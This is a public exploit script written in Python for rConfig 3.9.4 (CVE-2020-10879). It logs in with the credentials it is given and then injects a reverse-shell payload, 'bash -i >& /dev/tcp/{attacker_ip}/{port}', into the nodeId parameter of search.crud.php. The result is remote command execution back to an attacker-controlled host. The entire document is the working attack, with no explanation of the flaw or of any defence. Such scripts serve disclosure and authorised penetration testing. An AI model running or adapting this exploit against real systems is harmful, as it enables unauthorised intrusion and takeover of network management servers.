# Exploit Title: rConfig 3.9.4 - 'search.crud.php' Remote Command Injection
# Date: 2020-03-21
# Exploit Author: Matthew Aberegg, Michael Burkey
# Vendor Homepage: https://www.rconfig.com
# Software Link: https://www.rconfig.com/downloads/rconfig-3.9.4.zip
# Version: rConfig 3.9.4
# Tested on: Cent OS 7 (1908)
# CVE: CVE-2020-10879

#!/usr/bin/python3

import requests
import sys
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if len(sys.argv) != 6:
    print("[~] Usage : https://rconfig_host, Username, Password, Attacker IP, Attacker Port")
    exit()

host = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
attacker_ip = sys.argv[4]
attacker_port = sys.argv[5]

login_url = host + "/lib/crud/userprocess.php"
payload = "|| bash -i >& /dev/tcp/{0}/{1} 0>&1 ;".format(attacker_ip, attacker_port)
encoded_payload = urllib.parse.quote_plus(payload)


def exploit():
    s = requests.Session()

    res = s.post(
        login_url,
        data={
            'user': username,
            'pass': password,
            'sublogin': 1
        },
        verify=False,
        allow_redirects=True
    )

    injection_url = "{0}/lib/crud/search.crud.php?searchTerm=test&catId=2&numLineStr=&nodeId={1}&catCommand=showcdpneigh*.txt&noLines=".format(host, encoded_payload)
    res = s.get(injection_url, verify=False)

    if res.status_code != 200:
        print("[~] Failed to connect")


if __name__ == '__main__':
    exploit()